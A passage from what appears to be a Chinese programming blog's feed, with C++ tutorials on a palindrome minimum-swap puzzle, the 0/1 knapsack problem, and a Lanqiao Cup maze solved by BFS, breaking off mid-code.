    <content type="html"><![CDATA[<h1>题目</h1><p><strong>题目描述</strong></p><p>回文串，是一种特殊的字符串，它从左往右读和从右往左读是一样的。小龙龙认为回文串才是完美的。现在给你一个串，它不一定是回文的，请你计算最少的交换次数使得该串变成一个完美的回文串。</p><p>交换的定义是：交换两个相邻的字符例如mamad</p><p>第一次交换  ad  :  mamda</p><p>第二次交换  md  :  madma</p><p>第三次交换  ma  :  madam  (回文！完美！)</p><p><strong>输入</strong></p><p>第一行是一个整数N，表示接下来的字符串的长度(N  &lt; =  8000) 第二行是一个字符串，长度为N.只包含小写字母</p><p><strong>输出</strong></p><p>如果可能，输出最少的交换次数。 否则输出Impossible</p><p><strong>样例输入</strong></p><p><code>5  mamad</code></p><p><strong>样例输出</strong></p><p><code>3</code></p><h1>思路讲解</h1><p><strong>首先是Impossible的情况</strong></p><p>1️⃣当N是偶数且有一个字符出现次数为奇数时那一定不可能构成回文数如adaaaa</p><p>2️⃣当N是奇数且有两个不等的字符出现次数为奇数时页一定不可能构成回文数如abada</p><p><strong>然后是可以移成回文数的情况</strong></p><p>采用贪心思想，从左向右遍历当前字符串s[i]，然后从右向左遍历找到与当前字符串s[i]相等的字符串s[k]，将s[k]移到字符串末尾(彼此相邻的移动)，然后将指向末尾的指针减一。</p><p>再看s[i+1]，从右(末尾已经减一)向左遍历找到与其相同的字符再将其移到末尾，再将末尾减一，以此类推</p><p>🌰<strong>举个例子</strong></p><p>比如mamad，首先从左到右s[0]即m，然后从右向左遍历找到与其相同的字符即s[2]</p><p>然后将s[2]移到字符末尾即s[4]，移动的过程是s[2]和s[3]交换然后s[3]再和s[4]交换，然后将末尾指针减一，此时字符串变成了maadm</p><p>接着是s[1]即a从右向左遍历找到了s[2]与其相等，然后将其移到末尾，注意此时末尾指针已经减一，也就是s[2]移到s[3]的位置，此时字符串变成了madam</p><p>此时从左到右遍历的指针和从右向左的指针相等程序结束</p><p>整个过程一共移动了3次而3就是答案</p><p>可以发现整个移动过程其实和题目说的移动过程并不一致</p><h1>完整代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">string s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j = n<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//res用来统计交换的次数</span></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;<span class="comment">//flag用来统计出现奇数次数的字符个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; j; i++)<span class="comment">//i指针从头遍历到倒数第二个字符</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = j; k &gt;= i; k--)<span class="comment">//k指针从后面往前一直到i寻找和s[i]相同的s[k]</span></span><br><span class="line">&#123;</span><br><span class="line">            <span class="keyword">if</span>(k == i)<span class="comment">//如果找不到相同的</span></span><br><span class="line">&#123;</span><br><span class="line">flag++;</span><br><span class="line">                <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">0</span> || flag == <span class="number">2</span>)<span class="comment">//impossible的两种情况</span></span><br><span class="line">&#123;</span><br><span class="line">                    cout &lt;&lt; <span class="string">&quot;Impossible&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;               </span><br><span class="line">                res += n / <span class="number">2</span> - i;<span class="comment">//n为奇数时唯一一个奇数次出现的字符移到中间的次数</span></span><br><span class="line"><span class="comment">//n/2-i一定大于0即这个数是在整体的左边位置，如果在右边遍历前面的i时就已经把它移到中间了，如aaaad  </span></span><br><span class="line">            &#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s[i] == s[k])   </span><br><span class="line">&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> l = k; l &lt; j; l++) </span><br><span class="line">&#123;</span><br><span class="line">                    <span class="built_in">swap</span>(s[l], s[l+<span class="number">1</span>]);<span class="comment">//把s[k]换到s[j]处  </span></span><br><span class="line">                    res++;<span class="comment">//统计交换次数</span></span><br><span class="line">                &#125;</span><br><span class="line">                j--;<span class="comment">//将一个字符调到末尾后j减一即将末尾指针往前移一位</span></span><br><span class="line"><span class="comment">//方便下次交换到末尾且i和j相等时此时已经是回文数第一个for循环就结束了</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; res &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>参考</h1><p><a href="https://blog.csdn.net/liuchuo/article/details/51990430">蓝桥杯 BASIC-19 基础练习 完美的代价</a><br><a href="https://github.com/hushhw/LQOJ/blob/master/BASIC/BASIC-19%20%E5%AE%8C%E7%BE%8E%E7%9A%84%E4%BB%A3%E4%BB%B7.cpp">BASIC-19 完美的代价</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;题目描述&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;回文串，是一种特殊的字符串，它从左往右读和从右往左读是一样的。小龙龙认为回文串才是完美的。现在给你一个串，它不一定是回文的，请你计算最少的交换次数使得该串变成一个完美的回文串。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>01背包问题---动态规划</title>
    <link href="https://zss192.github.io/2021/03/28/01%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>https://zss192.github.io/2021/03/28/01%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</id>
    <published>2021-03-28T03:51:00.000Z</published>
    <updated>2021-03-30T03:52:18.954Z</updated>
    
    <content type="html"><![CDATA[<h1>问题描述</h1><p>🚩有N个物品，其重量分别为weight[i]，其价值分别为value[i]，现有一个容量为V的背包，问怎样装商品才能使得背包中的价值最大？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> N=<span class="number">5</span>,V=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> weight[]=&#123;<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> value[]=&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">10</span>&#125;;</span><br></pre></td></tr></table></figure><h1>思路讲解</h1><p>可先看B站这个视频讲解：<a href="https://www.bilibili.com/video/BV1K4411X766/">https://www.bilibili.com/video/BV1K4411X766/</a></p><p>其实就是相当于我们创建一个表格即dp[][]，左边那一列表示商品编号，上面那一行表示背包容量，表格内容是此时状态的最大价值</p><p>先看结果，如下</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210328182340133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>解释：</p><p>一行一行的填写，从上至下从左至右。如编号1重量为3，那么容量为0、1、2时都不能放下，最大价值都为0</p><p>当背包重量为3时可以放下商品1所以最大价值为4</p><p>再考虑第二行，j等于0~2时都放不下最大价值为0，由于商品2重量为6，那么背包容量为3~5时都放不下商品2只能放商品1最大价值为商品1的价值4。</p><p>而当背包容量为6时，此时能够放下商品2，那么就要考虑要不要放尚品2</p><p>1️⃣放商品2，那么最大价值就是此时背包的容量减去商品2的重量为0，再看第一行重量为0时的价值也是0，那么最大价值为6</p><p>2️⃣不放商品2，那么最大价值就是第一行背包容量为6时的最大价值为4</p><p>放商品2最大价值为6，不放最大价值为4，我们选最大值为6</p><p>总结如下：</p><p>若背包容量小于商品n的重量放不下商品</p><ul><li>那么前n个商品的最大价值和前n-1个商品的最大价值是一样的（既然不放相当于就不考虑这个商品，那么考虑前n个商品其实就是考虑前n-1个商品）</li></ul><p>若此时背包装得下商品n</p><ul><li>若选择放商品n，那么背包可用容量KV就等于背包总容量SV减去商品n的重量nV，那么问题就变成了只考虑前n-1个商品且背包容量为KV时的最大价值，而此前我们已经求得了这个值填写在了表中所以直接用这个值加上商品n的价值就是最大价值</li><li>若不放商品n，那么前n个商品的最大价值和前n-1个商品的最大价值是一样的</li><li>从以上两个选择选一个最大的就是最终的最大价值</li></ul><p>对应的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">1</span>; n &lt;= N; n++)<span class="comment">//遍历商品1~N</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span class="comment">//遍历容量0~V</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v&gt;=weight[n])<span class="comment">//背包容量大于等于商品n的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=<span class="built_in">max</span>(dp[n<span class="number">-1</span>][v-weight[n]]+value[n],dp[n<span class="number">-1</span>][v]); <span class="comment">//选择放商品n和不放商品n哪个价值最大</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//背包容量小于商品n的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=dp[n<span class="number">-1</span>][v];<span class="comment">//此时商品n一定不能放，此时最大价值就是商品1到i-1中，容量为v时的最大价值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们怎么知道求得的最大价值其中我们选了哪些商品呢</p><p>其实就是从表的右下角开始回溯，如果dp[n][j]和dp[n-1][j]值是一样的，那么我们肯定没装商品i(相当于我们就没考虑商品n)。事实上，我们推dp[n][j]时如果选择不放商品n那么我们就让dp[n][j]=dp[n-1][j]</p><p>所以相当于我们根据两个数值是否相等来判断当时我们是否选了商品n</p><p>相当于是求最大价值的一个逆过程</p><p>如果装了商品n，那么用总容量减去商品n的容量得到可用容量kV再来判断是否放了商品n-1，其实也就是看dp[n-1][kv]和dp[n-2][kv]是否相等，以此类推</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n=N,v=V;</span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[n][v]==dp[n<span class="number">-1</span>][v])</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;未被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">v=v-weight[n];</span><br><span class="line">&#125;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>🦄完整代码如下</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line"><span class="keyword">int</span> N=<span class="number">5</span>,V=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> weight[]=&#123;<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> value[]=&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印初始状态</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printInit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;共&quot;</span>&lt;&lt;N&lt;&lt;<span class="string">&quot;个商品，&quot;</span>&lt;&lt;<span class="string">&quot;背包容量为&quot;</span>&lt;&lt;V&lt;&lt;endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;的重量为&quot;</span>&lt;&lt;weight[i]&lt;&lt;<span class="string">&quot;，价值为&quot;</span>&lt;&lt;value[i]&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求最大价值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxValue</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">1</span>; n &lt;= N; n++)<span class="comment">//遍历商品1~N</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span class="comment">//遍历容量0~V</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v&gt;=weight[n])<span class="comment">//背包容量大于等于商品n的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=<span class="built_in">max</span>(dp[n<span class="number">-1</span>][v-weight[n]]+value[n],dp[n<span class="number">-1</span>][v]); <span class="comment">//选择放商品n和不放商品n哪个价值最大</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//背包容量小于商品i的容量时</span></span><br><span class="line">&#123;</span><br><span class="line">dp[n][v]=dp[n<span class="number">-1</span>][v];<span class="comment">//此时商品n一定不能放，此时最大价值就是商品1到n-1中，容量为v时的最大价值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[N][V];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印最大价值的商品选择情况</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSelect</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n=N,v=V;</span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[n][v]==dp[n<span class="number">-1</span>][v])</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;未被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;商品&quot;</span>&lt;&lt;n&lt;&lt;<span class="string">&quot;被选中&quot;</span>&lt;&lt;endl;</span><br><span class="line">v=v-weight[n];</span><br><span class="line">&#125;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printInit</span>();</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;最大价值为：&quot;</span>&lt;&lt;<span class="built_in">maxValue</span>()&lt;&lt;endl;</span><br><span class="line"><span class="built_in">printSelect</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;问题描述&lt;/h1&gt;
&lt;p&gt;🚩有N个物品，其重量分别为weight[i]，其价值分别为value[i]，现有一个容量为V的背包，问怎样装商品才能使得背包中的价值最大？&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯迷宫题解</title>
    <link href="https://zss192.github.io/2021/03/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E8%BF%B7%E5%AE%AB%E9%A2%98%E8%A7%A3/"/>
    <id>https://zss192.github.io/2021/03/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E8%BF%B7%E5%AE%AB%E9%A2%98%E8%A7%A3/</id>
    <published>2021-03-26T12:50:00.000Z</published>
    <updated>2021-03-30T03:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1>问题描述</h1><p>下图给出了一个迷宫的平面图，其中标记为 1 的为障碍，标记为 0 的为可 以通行的地方。</p><p>010000<br>000100<br>001001<br>110000</p><p>迷宫的入口为左上角，出口为右下角，在迷宫中，只能从一个位置走到这 个它的上、下、左、右四个方向之一。</p><p>对于上面的迷宫，从入口开始，可以按 DRRURRDDDR 的顺序通过迷宫，一共 10 步。</p><p>其中 D、U、L、R 分别表示向下、向上、向左、向右走。</p><p>对于下面这个更复杂的迷宫（30 行 50 列）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01010101001011001001010110010110100100001000101010</span></span><br><span class="line"><span class="number">00001000100000101010010000100000001001100110100101</span></span><br><span class="line"><span class="number">01111011010010001000001101001011100011000000010000</span></span><br><span class="line"><span class="number">01000000001010100011010000101000001010101011001011</span></span><br><span class="line"><span class="number">00011111000000101000010010100010100000101100000000</span></span><br><span class="line"><span class="number">11001000110101000010101100011010011010101011110111</span></span><br><span class="line"><span class="number">00011011010101001001001010000001000101001110000000</span></span><br><span class="line"><span class="number">10100000101000100110101010111110011000010000111010</span></span><br><span class="line"><span class="number">00111000001010100001100010000001000101001100001001</span></span><br><span class="line"><span class="number">11000110100001110010001001010101010101010001101000</span></span><br><span class="line"><span class="number">00010000100100000101001010101110100010101010000101</span></span><br><span class="line"><span class="number">11100100101001001000010000010101010100100100010100</span></span><br><span class="line"><span class="number">00000010000000101011001111010001100000101010100011</span></span><br><span class="line"><span class="number">10101010011100001000011000010110011110110100001000</span></span><br><span class="line"><span class="number">10101010100001101010100101000010100000111011101001</span></span><br><span class="line"><span class="number">10000000101100010000101100101101001011100000000100</span></span><br><span class="line"><span class="number">10101001000000010100100001000100000100011110101001</span></span><br><span class="line"><span class="number">00101001010101101001010100011010101101110000110101</span></span><br><span class="line"><span class="number">11001010000100001100000010100101000001000111000010</span></span><br><span class="line"><span class="number">00001000110000110101101000000100101001001000011101</span></span><br><span class="line"><span class="number">10100101000101000000001110110010110101101010100001</span></span><br><span class="line"><span class="number">00101000010000110101010000100010001001000100010101</span></span><br><span class="line"><span class="number">10100001000110010001000010101001010101011111010010</span></span><br><span class="line"><span class="number">00000100101000000110010100101001000001000000000010</span></span><br><span class="line"><span class="number">11010000001001110111001001000011101001011011101000</span></span><br><span class="line"><span class="number">00000110100010001000100000001000011101000000110011</span></span><br><span class="line"><span class="number">10101000101000100010001111100010101001010000001000</span></span><br><span class="line"><span class="number">10000010100101001010110000000100101010001011101000</span></span><br><span class="line"><span class="number">00111100001000010000000110111000000001000000001011</span></span><br><span class="line"><span class="number">10000001100111010111010001000110111010101101111000</span></span><br></pre></td></tr></table></figure><p>请找出一种通过迷宫的方式， 其使用的步数最少，在步数最少的前提下，请找出字典序最小的一个作为答案。</p><p>请注意在字典序中 D &lt; L &lt; R &lt; U。</p><p>答案提交<br>这是一道结果填空的题，你只需要算出结果后提交即可。<br>本题的结果为一 个字符串，包含四种字母 D、U、L、R，在提交答案时只填写这个字符串，填写多余的内容将无法得分。</p><h1>题解</h1><p>迷宫类求最短路径问题所以用bfs来求，注意如果使用dfs会很长时间跑不出结果。<br>题目中要求步数相同的情况下输出字典序最小的那个，那么我们可以在遍历四个方向的时候顺序也是D  L  R  U，这样就保证了第一个找到的解既满足步数最小也满足字典序最小</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> //结构体<span class="title">node</span>记录<span class="title">xy</span>坐标和走的顺序</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> x,y;string s;</span><br><span class="line"><span class="built_in">node</span>(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy,string ss)</span><br><span class="line">&#123;</span><br><span class="line">x=xx;y=yy,s=ss;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">string mp[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> zimu[<span class="number">4</span>]=&#123;<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;U&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> m=<span class="number">30</span>,n=<span class="number">50</span>;</span><br><span class="line">queue&lt;node &gt; qn;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">qn.<span class="built_in">push</span>(<span class="built_in">node</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;&quot;</span>));</span><br><span class="line">visited[x][y]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(!qn.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">node t=qn.<span class="built_in">front</span>();</span><br><span class="line">qn.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tx=t.x+dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> ty=t.y+dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(tx&gt;=<span class="number">0</span>&amp;&amp;tx&lt;m&amp;&amp;ty&gt;=<span class="number">0</span>&amp;&amp;ty&lt;n&amp;&amp;!visited[tx][ty]&amp;&amp;mp[tx][ty]!=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(tx==m<span class="number">-1</span>&amp;&amp;ty==n<span class="number">-1</span>)</span><br><span 